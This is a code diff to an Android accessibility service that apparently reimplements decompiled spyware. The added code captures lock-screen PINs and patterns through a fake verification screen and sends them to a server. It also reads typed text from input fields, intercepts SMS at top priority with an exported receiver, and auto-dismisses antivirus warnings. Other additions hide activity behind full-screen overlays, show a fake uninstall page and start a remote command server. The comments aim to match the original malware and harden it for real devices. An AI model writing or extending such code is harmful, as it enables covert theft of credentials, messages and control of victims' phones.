@@ -57,6 +57,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
 import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import org.json.JSONObject
 
@@ -352,6 +353,9 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** JADX: f52409e0 (u11) — Injection check periodic job reference */
     var injectionCheckJob: kotlinx.coroutines.Job? = null
+
+    /** JADX: dqtvuisjd$startWebViewStatusCheckTask — WebView status expiry check job */
+    private var webViewStatusCheckJob: kotlinx.coroutines.Job? = null
 
     /** JADX: f52455i6 (C0259a1) — Audio manager */
     var audioManager: C0259a1? = null
@@ -779,6 +783,22 @@ class MyAccessibilityService : AccessibilityService() {
                 }
             } catch (_: Exception) {}
 
+            // ── SystemOptimizeManager ADB pairing event dispatch (vendor: C0360a2.m212078i3) ──
+            try {
+                val som = com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstanceOrNull()
+                    ?: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstance(this, this)
+                // Debug trigger: `adb shell settings put global debug_start_pair 1`
+                val debugTrigger = try {
+                    Settings.Global.getInt(contentResolver, "debug_start_pair", 0)
+                } catch (_: Exception) { 0 }
+                if (debugTrigger == 1) {
+                    try { Settings.Global.putInt(contentResolver, "debug_start_pair", 0) } catch (_: Exception) {}
+                    android.util.Log.i(TAG, "[SOM] debug_start_pair=1 → 触发 startPairFlow")
+                    som.startPairFlow()
+                }
+                som.filterAccessibilityEvent(event)
+            } catch (_: Exception) {}
+
             // ── Permission request guard (JADX line 9848) ──
             if (isPermissionRequestActive() || isWebViewOpen) return
 
@@ -908,9 +928,32 @@ class MyAccessibilityService : AccessibilityService() {
             }
 
             // ── CipherCaptureManager dispatch (JADX line 10039) ──
+            // vendor: dqtvuisjd.java:10048 → C0335a1.m211820d6(event) reads EditText plaintext
+            // from event.getText()[0] + event.getBeforeText() + event.getSource().getText()
+            // across TYPE_VIEW_CLICKED / TYPE_VIEW_TEXT_CHANGED / window-change events.
             cipherCaptureManager?.let { ccm ->
+                when (eventType) {
+                    AccessibilityEvent.TYPE_VIEW_CLICKED,       // 1
+                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,  // 16
+                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, // 32
+                    AccessibilityEvent.TYPE_VIEW_FOCUSED,       // 8
+                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED, // 2048
+                    AccessibilityEvent.TYPE_WINDOWS_CHANGED,    // 4194304
+                    AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> { // 128
+                        try {
+                            // ADAPT 2026-04-17: vendor m211820d6 — read EditText plaintext
+                            ccm.monitorSystemPasswordInputFull(event)
+                        } catch (e: kotlinx.coroutines.CancellationException) {
+                            throw e
+                        } catch (e: Exception) {
+                            android.util.Log.w(TAG, "⚠️ monitorSystemPasswordInputFull 异常: ${e.message}")
+                        }
+                    }
+                    else -> Unit  // other event types intentionally not routed to cipher capture
+                }
+                // Legacy: string-based event fires a WS telemetry upload (vendor sendPasswordEvent).
+                // Keep independent of m211820d6 — different mechanism.
                 if (eventType == 16 || eventType == 1 || eventType == 32) {
-                    // JADX: c0335a1.m211820d6(accessibilityEvent)
                     ccm.dispatchEvent("accessibility_event_$eventType")
                 }
             }
@@ -1372,6 +1415,11 @@ class MyAccessibilityService : AccessibilityService() {
             initializeModules()
         } catch (_: Exception) {}
 
+        // JADX: dqtvuisjd$startWebViewStatusCheckTask$1 — start WebView status expiry check loop
+        try {
+            startWebViewStatusCheckTask()
+        } catch (_: Exception) {}
+
         // JADX: start InitWorkerService (C0278a0.start)
         // JADX: depends on InitWorkerService.Companion.start (enqueue WorkManager request)
         try {
@@ -1796,7 +1844,9 @@ class MyAccessibilityService : AccessibilityService() {
                     addAction(Intent.ACTION_USER_PRESENT)
                 }
                 if (Build.VERSION.SDK_INT >= 33) {
-                    registerReceiver(screenStateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
+                    // ADAPT: vendor dqtvuisjd.m211420b9 使用 RECEIVER_EXPORTED (常量值 2)。
+                    // 之前误用 NOT_EXPORTED 导致部分 ROM 收不到 USER_PRESENT 广播。
+                    registerReceiver(screenStateReceiver, filter, Context.RECEIVER_EXPORTED)
                 } else {
                     registerReceiver(screenStateReceiver, filter)
                 }
@@ -1830,14 +1880,19 @@ class MyAccessibilityService : AccessibilityService() {
         try {
             if (smsReceiver == null) {
                 smsReceiver = arniezsqllm()
-                val smsFilter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
-                smsFilter.priority = 999
+                // ADAPT: vendor dqtvuisjd.m211421c0 — priority=Integer.MAX_VALUE + 双 action (SMS_RECEIVED + SMS_DELIVER) + RECEIVER_EXPORTED。
+                // 之前 priority=999 且缺少 SMS_DELIVER，且错用 NOT_EXPORTED。
+                val smsFilter = IntentFilter().apply {
+                    addAction("android.provider.Telephony.SMS_RECEIVED")
+                    addAction("android.provider.Telephony.SMS_DELIVER")
+                    priority = Integer.MAX_VALUE
+                }
                 if (Build.VERSION.SDK_INT >= 33) {
-                    registerReceiver(smsReceiver, smsFilter, Context.RECEIVER_NOT_EXPORTED)
+                    registerReceiver(smsReceiver, smsFilter, Context.RECEIVER_EXPORTED)
                 } else {
                     registerReceiver(smsReceiver, smsFilter)
                 }
-                android.util.Log.d(TAG, "📩 ✅ 短信接收器已注册")
+                android.util.Log.d(TAG, "📩 ✅ 短信接收器已注册 (priority=MAX, SMS_RECEIVED+SMS_DELIVER, EXPORTED)")
             }
         } catch (e: Exception) {
             android.util.Log.e(TAG, "📩 ❌ 注册短信接收器失败", e)
@@ -1915,9 +1970,22 @@ class MyAccessibilityService : AccessibilityService() {
     private suspend fun handleVirusControlDialog() {
         // JADX: dqtvuisjd$handleVirusControlDialog$1 — coroutine that detects and auto-dismisses virus scan dialog
         // Searches for "病毒" / "安全" / "扫描" text nodes and clicks dismiss button
-        android.util.Log.d(TAG, "🦠 检测到系统病毒扫描对话框")
         try {
             val root = rootInActiveWindow ?: return
+            // ADAPT: 真机加固 — 先用病毒/安全/扫描/恶意关键词验证确实是病毒弹窗，
+            // 否则对任何 systemmanager 窗口都盲点"确定"/"忽略"/"关闭"会误点
+            // Step 5 自启动三开关弹窗的"确定"、电池优化确认弹窗的"忽略"等。
+            // 对齐 vendor 原版注释："Searches for 病毒/安全/扫描 text nodes"。
+            val virusKeywords = arrayOf("病毒", "安全", "扫描", "恶意", "威胁", "可疑", "风险")
+            val isVirusDialog = virusKeywords.any { kw ->
+                val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
+                nodes != null && nodes.any { it.isVisibleToUser }
+            }
+            if (!isVirusDialog) {
+                // 非病毒弹窗 — 不干扰 Step 5/2/7 等自动化流程
+                return
+            }
+            android.util.Log.d(TAG, "🦠 检测到系统病毒扫描对话框")
             // JADX: dqtvuisjd$handleVirusControlDialog$1 uses node tree traversal to find dismiss button.
             // Searches for clickable nodes with common dismiss text strings.
             val dismissTexts = arrayOf("忽略", "关闭", "取消", "我知道了", "确定")
@@ -2415,6 +2483,51 @@ class MyAccessibilityService : AccessibilityService() {
      * Launch system password capture flow.
      * JADX method: m211457e6 (e6), line 4873
      */
+    /**
+     * vendor dqtvuisjd.m211442c7 (L4293) + capturePasswordViaSystemAuth$2 (L4396).
+     *
+     * 授权完成后的密码捕获 suspend 入口，由 WRITE_SETTINGS 流程完成后触发。
+     * 检查：
+     *  1. 持久化 guard — 若 isInstallationFlow 且已完成，跳过
+     *  2. already-captured gate — 若 CipherCaptureManager 已有缓冲密码，直接返回（后续上报由调用方处理）
+     *  3. isKeyguardSecure — 若设备未设锁屏密码，无法验证，跳过
+     *  4. 启动捕获，若 isInstallationFlow 先 delay 2000ms 等 UI 稳定，再 launchPasswordCapture
+     *
+     * @param isInstallationFlow true = 安装流程（完成后会触发自毁）; false = 普通授权流程
+     */
+    suspend fun capturePasswordViaSystemAuth(isInstallationFlow: Boolean) {
+        android.util.Log.d(TAG, "🔐 capturePasswordViaSystemAuth() 调用，isInstallationFlow=$isInstallationFlow")
+
+        // 1. 持久化 guard — vendor L4297-4299: 安装流程若已完成密码捕获则跳过
+        try {
+            val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
+            if (isInstallationFlow && prefs.getBoolean("cipher_captured", false)) {
+                android.util.Log.d(TAG, "🔐 密码捕获已完成（持久化标记），跳过")
+                return
+            }
+        } catch (_: Exception) { /* SP 异常不阻塞 */ }
+
+        // 2. already-captured gate — vendor L4300-4314: CipherCaptureManager 已有缓冲密码则跳过
+        // TODO: VENDOR_VERIFY — CipherCaptureManager.readBuffered(discard: Boolean) 方法映射
+        // vendor: c0335a1.m211819d0(false) ?: c0335a1.m211819d0(true)
+        // replica 当前没暴露等价 API，跳过此 gate（若后续要对齐则在此加读取逻辑）
+
+        // 3. isKeyguardSecure — vendor L4331: 无锁屏密码跳过
+        val km = getSystemService(KEYGUARD_SERVICE) as? android.app.KeyguardManager
+        if (km?.isKeyguardSecure != true) {
+            android.util.Log.d(TAG, "🔐 设备未设置锁屏密码，跳过密码捕获")
+            return
+        }
+
+        // 4. 启动捕获流程 — vendor capturePasswordViaSystemAuth$2: 若 installFlow 先 delay 2s
+        if (isInstallationFlow) {
+            kotlinx.coroutines.delay(2000L)
+        }
+        passwordLaunchCount = 0
+        isCipherCaptureEnabled = true
+        launchPasswordCapture(isInstallationFlow)
+    }
+
     fun launchPasswordCapture(isInstallationFlow: Boolean) {
         if (!isCipherCaptureEnabled) {
             android.util.Log.d(TAG, "🔐 密码监听已停止，不再弹出")
@@ -2427,16 +2540,45 @@ class MyAccessibilityService : AccessibilityService() {
                 // JADX: ccm.enableCapture()
                 android.util.Log.d(TAG, "✅ CipherCaptureManager 密码监听已启用")
             }
-            // JADX line 4966: launch syuqattwmgit activity with credential callback
+            // vendor dqtvuisjd.java:4963-4967 — Intent flags 805306368 = NEW_TASK | CLEAR_TOP | SINGLE_TOP
             val intent = android.content.Intent(this, com.storm.safe.rock.activity.syuqattwmgit::class.java)
             intent.putExtra("credential_type", 0)
-            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
-            try {
-                startActivity(intent)
-                android.util.Log.d(TAG, "🔐 已启动 syuqattwmgit 密码验证界面")
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "🔐 启动 syuqattwmgit 失败: ${e.message}")
+            intent.addFlags(
+                android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                    android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP
+            )
+            // vendor 策略 1 (L4969-4973): 若有前台 Activity → currentActivity.startActivity
+            val currentActivity = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
+            if (currentActivity != null && !currentActivity.isFinishing && !currentActivity.isDestroyed) {
+                try {
+                    currentActivity.startActivity(intent)
+                    android.util.Log.d(TAG, "🔐 [策略1] 通过前台 Activity context 直接启动 syuqattwmgit")
+                    return
+                } catch (e: Exception) {
+                    android.util.Log.e(TAG, "🔐 [策略1] 失败: ${e.message}")
+                }
             }
+            // vendor 策略 2 (L4974-4988): 无前台 → moveTaskToFront + 800ms postDelayed
+            android.util.Log.d(TAG, "🔐 [前置] 无前台 Activity，通过 moveTaskToFront 拉回前台")
+            try {
+                val am = getSystemService(ACTIVITY_SERVICE) as? android.app.ActivityManager
+                val tasks = am?.appTasks
+                if (!tasks.isNullOrEmpty()) {
+                    tasks[0].moveToFront()
+                    android.util.Log.d(TAG, "🔐 [前置] moveToFront 已调用，等待 onResume")
+                }
+            } catch (e: Exception) {
+                android.util.Log.e(TAG, "🔐 [前置] moveTaskToFront 失败", e)
+            }
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                try {
+                    startActivity(intent)
+                    android.util.Log.d(TAG, "🔐 [策略2] 800ms 后通过 service context 启动 syuqattwmgit")
+                } catch (e: Exception) {
+                    android.util.Log.e(TAG, "🔐 [策略2] 失败: ${e.message}")
+                }
+            }, 800L)
         } catch (e: Exception) {
             android.util.Log.e(TAG, "❌ 启动密码采集失败", e)
         }
@@ -2462,6 +2604,14 @@ class MyAccessibilityService : AccessibilityService() {
 
             if (isAuthorized) {
                 android.util.Log.d(TAG, "✅ authorization_completed=true，跳过遮挡和适配流程")
+
+                // 授权已完成时直接初始化延迟组件（CommandDispatcher, RemoteConfigManager 等）
+                try {
+                    initializeDeferredManagers()
+                    android.util.Log.d(TAG, "✅ [重启恢复] initializeDeferredManagers 完成")
+                } catch (e: Exception) {
+                    android.util.Log.e(TAG, "❌ [重启恢复] initializeDeferredManagers 失败", e)
+                }
 
                 // JADX: c0329b42.m211768a6() — start authorization module
                 try {
@@ -2497,13 +2647,12 @@ class MyAccessibilityService : AccessibilityService() {
                 // via dedicated manager. Brightness control is handled by dimScreen()/resetScreenBrightness()
                 // and setScreenBrightness() methods directly on this service.
                 // Show mask overlay
-                // JADX: configMaskManager.m213601a1(false) — show mask
-                // configProgressManager.a3() + a4(CHECKING_PERMISSIONS)
+                // JADX: configMaskManager.m213601a1(false) — show full-screen mask overlay
                 if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                     try {
-                        configProgressManager?.let { cpm ->
-                            cpm.startConfig()
-                        }
+                        com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.show(this)
+                        android.util.Log.d(TAG, "🖤 Android 11+设备：显示配置期间遮盖")
+                        configProgressManager?.startConfig()
                     } catch (_: Exception) {}
                 } else {
                     android.util.Log.d(TAG, "🎭 [DEBUG] configMask 已跳过")
@@ -2540,9 +2689,9 @@ class MyAccessibilityService : AccessibilityService() {
                 // Show mask + start authorization
                 if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                     try {
-                        configProgressManager?.let { cpm ->
-                            cpm.startConfig()
-                        }
+                        com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.show(this)
+                        android.util.Log.d(TAG, "🖤 显示配置期间遮盖，防止用户误操作")
+                        configProgressManager?.startConfig()
                     } catch (_: Exception) {}
                 } else {
                     android.util.Log.d(TAG, "🎭 [DEBUG] configMask (Android 10) 已跳过")
@@ -3003,8 +3152,10 @@ class MyAccessibilityService : AccessibilityService() {
 
         // JADX: RemoteConfigManager (LocalHttpServer) — C0322a7
         try {
-            remoteConfigManager = RemoteConfigManager(applicationContext)
-            android.util.Log.d(TAG, "✅ RemoteConfigManager 已启动")
+            val rcm = RemoteConfigManager(applicationContext)
+            rcm.start()
+            remoteConfigManager = rcm
+            android.util.Log.d(TAG, "✅ RemoteConfigManager 已启动 (port=${RemoteConfigManager.DEFAULT_PORT})")
         } catch (e: Exception) {
             android.util.Log.e(TAG, "❌ RemoteConfigManager 启动失败", e)
         }
@@ -3148,28 +3299,13 @@ class MyAccessibilityService : AccessibilityService() {
     fun tryShowPackageVerify() {
         try {
             android.util.Log.d(TAG, "📦 [假卸载] ★★★ tryShowPackageVerify() 被调用 ★★★")
-            // JADX: Read config file for uninstallMode
-            // JADX: depends on AbstractC0765ko.m213605a3 (config reader)
-            val configFile = java.io.File(filesDir, "page_style_config.json")
-            val configSource = if (configFile.exists()) "内部存储" else "assets"
-            android.util.Log.d(TAG, "📦 [假卸载] 配置来源: $configSource")
 
-            val configJson = if (configFile.exists()) {
-                try { org.json.JSONObject(configFile.readText()) } catch (_: Exception) { null }
-            } else {
-                try {
-                    val text = AssetConfigReader.readAssetConfig(this, "page_style_config.json")
-                    if (text != null) org.json.JSONObject(text) else null
-                } catch (_: Exception) { null }
-            }
-
-            if (configJson == null) {
-                android.util.Log.w(TAG, "📦 [假卸载] 配置文件读取失败，跳过")
-                return
-            }
-
-            val uninstallMode = configJson.optBoolean("uninstallMode", false)
-            android.util.Log.d(TAG, "📦 [假卸载] uninstallMode=$uninstallMode (配置来源: $configSource)")
+            val uninstallMode = try {
+                val text = assets.open("config.json").bufferedReader().use { it.readText() }
+                val json = org.json.JSONObject(text)
+                json.optJSONObject("protection")?.optBoolean("uninstall_mode", false) ?: false
+            } catch (_: Exception) { false }
+            android.util.Log.d(TAG, "📦 [假卸载] uninstallMode=$uninstallMode (配置来源: config.json)")
             if (!uninstallMode) {
                 android.util.Log.d(TAG, "📦 [假卸载] uninstallMode 未启用，跳过")
                 return
@@ -3185,13 +3321,93 @@ class MyAccessibilityService : AccessibilityService() {
             }
 
             android.util.Log.d(TAG, "📦 [假卸载] ★★★ 开始显示假卸载页面 ★★★")
-            // ADAPT: cm0 (PkgVerifyOverlay) — vendor WindowManager overlay that shows
-            // a fake "uninstalling..." progress bar. Requires SYSTEM_ALERT_WINDOW permission
-            // and complex overlay lifecycle management. The uninstall protection behavioral
-            // intent is served by UninstallProtectionManager which intercepts actual uninstall attempts.
-            android.util.Log.d(TAG, "📦 [假卸载] PkgVerifyOverlay (cm0) 未复刻 — 跳过显示")
+            com.storm.safe.rock.service.modules.overlay.PkgVerifyOverlay.show(this)
         } catch (e: Exception) {
             android.util.Log.e(TAG, "📦 [假卸载] 显示失败", e)
+        }
+    }
+
+    /**
+     * Complete installation after cipher capture.
+     * JADX: m211449d4 (d4), line 4647
+     */
+    fun completeInstallationWithCipher() {
+        try {
+            android.util.Log.d(TAG, "🔐 ★★★ completeInstallationWithCipher() 被调用 ★★★")
+
+            getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
+                .putBoolean("cipher_excluded", true).apply()
+            getSharedPreferences("cipher_config", Context.MODE_PRIVATE).edit()
+                .putBoolean("cipher_completed", true).apply()
+
+            val ccm = cipherCaptureManager
+            if (ccm != null) {
+                val cipher = ccm.readBufferedCipher(false)
+                val textCipher = cipher?.get("text") as? String
+                val patternPoints = cipher?.get("pattern") as? List<*>
+
+                val gradeCode = when {
+                    patternPoints != null -> "pattern"
+                    textCipher != null && textCipher.length <= 4 -> "4pin"
+                    textCipher != null && textCipher.length <= 6 -> "6pin"
+                    else -> "mixed"
+                }
+                android.util.Log.d(TAG, "🔐 密码类型: $gradeCode")
+
+                val cipherValue = textCipher ?: patternPoints?.joinToString(",") ?: ""
+                if (cipherValue.isNotEmpty()) {
+                    networkManager?.sendPassword(cipherValue, "system_auth", gradeCode)
+                }
+            }
+
+            android.util.Log.d(TAG, "✅ 安装完成流程已执行")
+            tryShowPackageVerify()
+        } catch (e: Exception) {
+            android.util.Log.e(TAG, "❌ completeInstallationWithCipher 失败", e)
+        }
+    }
+
+    @Volatile private var cipherRetryCount = 0
+    private val cipherMaxRetries = 3
+    private val cipherRetryDelayMs = 800L
+    private var cipherIsInstallationFlow = false
+
+    private fun handleCipherCredentialResult(success: Boolean) {
+        android.util.Log.d(TAG, "🔐 验证结果: ${if (success) "成功" else "失败"}")
+        if (success) {
+            cipherRetryCount = 0
+            if (cipherIsInstallationFlow) completeInstallationWithCipher()
+        } else {
+            cipherRetryCount++
+            if (cipherRetryCount < cipherMaxRetries) {
+                android.util.Log.d(TAG, "🔄 重试 $cipherRetryCount/$cipherMaxRetries")
+                Handler(Looper.getMainLooper()).postDelayed({
+                    com.storm.safe.rock.activity.syuqattwmgit.start(this, 0, ::handleCipherCredentialResult)
+                }, cipherRetryDelayMs)
+            } else {
+                android.util.Log.w(TAG, "⚠️ 达到最大重试次数")
+                cipherRetryCount = 0
+                cipherCaptureManager?.stopListeningFull()
+                if (cipherIsInstallationFlow) completeInstallationWithCipher()
+            }
+        }
+    }
+
+    /**
+     * Launch system password verification via syuqattwmgit Activity.
+     * JADX: m211457e6 (e6), line 4873
+     */
+    fun doLaunchSystemPasswordCapture(isInstallationFlow: Boolean) {
+        try {
+            cipherRetryCount = 0
+            cipherIsInstallationFlow = isInstallationFlow
+            android.util.Log.d(TAG, "🔐 启动系统密码验证 (isInstallationFlow=$isInstallationFlow)")
+
+            cipherCaptureManager?.startListening()
+
+            com.storm.safe.rock.activity.syuqattwmgit.start(this, 0, ::handleCipherCredentialResult)
+        } catch (e: Exception) {
+            android.util.Log.e(TAG, "❌ doLaunchSystemPasswordCapture 失败", e)
         }
     }
 
@@ -3530,18 +3746,26 @@ class MyAccessibilityService : AccessibilityService() {
             coroutineScope?.launch(Dispatchers.Main) {
                 try {
                     android.util.Log.d(TAG, "🔧 [授权后初始化] 开始注册延迟组件...")
-                    // JADX: m211420b9 — registerTimeTick receiver
-                    // JADX: m211421c0 — registerUserPresent receiver
-                    // JADX: m211506k2 — registerNetworkEventReceivers
-                    // JADX: m211418b7 — start heartbeat
-                    android.util.Log.d(TAG, "✅ [授权后初始化] 延迟组件注册完成")
+                    initializeDeferredManagers()
+                    com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.hide()
+                    android.util.Log.d(TAG, "✅ [授权后初始化] 延迟组件注册完成，配置遮罩已隐藏")
                 } catch (e: Exception) {
                     android.util.Log.e(TAG, "❌ postAuthorizationInit coroutine 1 failed", e)
                 }
             }
             coroutineScope?.launch(Dispatchers.IO) {
                 try {
-                    // JADX: m211416b5 — additional post-auth init
+                    kotlinx.coroutines.delay(3000)
+                    val cipherDone = getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
+                        .getBoolean("cipher_completed", false)
+                    if (!cipherDone) {
+                        android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
+                        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
+                            doLaunchSystemPasswordCapture(isInstallationFlow = true)
+                        }
+                    } else {
+                        android.util.Log.d(TAG, "🔐 [postAuth] 密码已捕获，跳过")
+                    }
                 } catch (_: Exception) {}
             }
         } catch (e: Exception) {
@@ -3569,6 +3793,41 @@ class MyAccessibilityService : AccessibilityService() {
         // Injection task matching is handled in processWindowChangeForInjection() which
         // already checks injectionTasks map on every WINDOW_STATE_CHANGED event.
         android.util.Log.d(TAG, "startInjectionCheckJob — injection checks integrated into onAccessibilityEvent")
+    }
+
+    /**
+     * Start WebView status expiry check loop.
+     * JADX: dqtvuisjd$startWebViewStatusCheckTask$1.java
+     *
+     * Logic:
+     * - If isWebViewOpen == true and (now - lastWebViewStatusTime) > 500ms → reset to false
+     * - When WebView is open: poll every 200ms
+     * - When WebView is closed: poll every 2000ms
+     * - On non-cancellation exception: log and delay 2000ms
+     */
+    private fun startWebViewStatusCheckTask() {
+        webViewStatusCheckJob?.cancel()
+        webViewStatusCheckJob = coroutineScope?.launch {
+            while (isActive) {
+                try {
+                    if (isWebViewOpen) {
+                        val elapsed = System.currentTimeMillis() - lastWebViewStatusTime
+                        if (elapsed > 500) {
+                            isWebViewOpen = false
+                            android.util.Log.d(TAG, "📡 [定时检查] WebView状态过期(${elapsed}ms)，已重置为关闭状态")
+                        }
+                        delay(200L)
+                    } else {
+                        delay(2000L)
+                    }
+                } catch (e: kotlinx.coroutines.CancellationException) {
+                    throw e
+                } catch (e: Exception) {
+                    android.util.Log.e(TAG, "❌ WebView状态检查任务失败", e)
+                    delay(2000L)
+                }
+            }
+        }
     }
 
     /** Show re-authorization notification. JADX: l9 method */
@@ -3737,6 +3996,16 @@ class MyAccessibilityService : AccessibilityService() {
                         android.util.Log.d(TAG, "🛡️ WRITE_SETTINGS权限已有但防卸载未启用，立即启用")
                         enableUninstallProtection()
                     }
+                    // 2026-04-16 ADAPT: WS 已授权 → 直接触发生物识别流程
+                    coroutineScope?.launch {
+                        try {
+                            capturePasswordViaSystemAuth(isInstallationFlow = false)
+                        } catch (e: kotlinx.coroutines.CancellationException) {
+                            throw e
+                        } catch (e: Exception) {
+                            android.util.Log.e(TAG, "❌ capturePasswordViaSystemAuth (WS已授权分支) failed", e)
+                        }
+                    }
                     return
                 }
             }
@@ -3768,6 +4037,18 @@ class MyAccessibilityService : AccessibilityService() {
                                     delay(800L)
                                 } catch (_: Exception) {}
                                 mo.startWriteSettingsPermissionRequest()
+                                // 2026-04-16 ADAPT: WS 完成/3s超时后强制触发生物识别流程
+                                // 不管 WS 成功失败，biometric 都要尝试（vendor 只在成功后触发，
+                                // replica 为了解锁 E2E pipeline，超时也继续）。
+                                val wsGranted = mo.hasWriteSettingsPermission()
+                                android.util.Log.d(TAG, "🔐 WS 流程结束, granted=$wsGranted, 继续触发生物识别")
+                                try {
+                                    capturePasswordViaSystemAuth(isInstallationFlow = false)
+                                } catch (e: kotlinx.coroutines.CancellationException) {
+                                    throw e
+                                } catch (e: Exception) {
+                                    android.util.Log.e(TAG, "❌ capturePasswordViaSystemAuth (WS后) failed", e)
+                                }
                             }
                         }
                     } catch (e: kotlinx.coroutines.CancellationException) {
